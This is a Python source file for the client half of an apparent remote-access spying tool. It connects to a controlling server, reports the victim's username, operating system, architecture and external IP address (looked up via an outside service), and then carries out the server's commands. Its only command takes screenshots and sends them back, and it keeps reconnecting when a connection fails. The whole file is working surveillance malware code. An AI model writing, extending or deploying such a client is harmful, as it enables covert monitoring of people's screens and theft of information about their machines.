# coding: utf-8

__author__ = '@zNairy'
__contact__ = 'Discord: __Nairy__#7181 | Github: https://github.com/zNairy/'
__version__ = '2.0'

from socket import socket, AF_INET, SOCK_STREAM
from getpass import getuser
from datetime import datetime
from pyscreenshot import grab
from pickle import dumps
from requests import get, packages
from os import uname
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning

packages.urllib3.disable_warnings(InsecureRequestWarning)

class Client(object):
    def __init__(self, host='0.0.0.0', port=1234):
        self.__Address = (host, port)
        self.screenshotPath = '/home/znairy/736f6e61726973.png'

    def __repr__(self):
        print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')

    def screenshot(self, args):
        grab().save(self.screenshotPath)
        log = datetime.now()
        
        with open(self.screenshotPath, 'rb') as file:
            file = file.read()

        header = {
            "namefile": f"{log.day}-{log.month}-{log.year}.{log.hour}-{log.minute}-{log.second}",
            "extension": "png",
            "bytes": len(file) 
        }

        self.__Client.send(dumps(header))
        sleep(1)
        self.__Client.send(file)

    def allCommands(self):
        commands = {
            "/screenshot": {"action": self.screenshot}
        }

        return commands

    def splitCommand(self, command):
            return self.allCommands()[command[0]], command[1:] # 1: function, 2: args #

    def runCommand(self, command):
        command, args = self.splitCommand(command.split())
        command['action'](args)

    def listenServer(self):
        while True:
            command = self.__Client.recv(512)
            if command:
                self.runCommand(command.decode('utf-8'))
            else:
                self.run()

    def identifier(self):
        try:
            eAddress = get('https://api.ipify.org?format=text').content.decode()
        except Exception:
            eAddress = ''
        
        return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress})

    def connect(self):
            self.__Client.connect((self.__Address))
            self.__Client.send(self.identifier())

    def configureSocket(self):
        self.__Client = socket(AF_INET, SOCK_STREAM)

    def run(self):
        self.configureSocket()
        try:
            self.connect()
        except Exception as err:
            print(err)
            sleep(1);self.run()
        finally:
            self.listenServer()


def main():
    client = Client('127.0.0.1', 5000)
    client.run()

if __name__ == '__main__':
    main()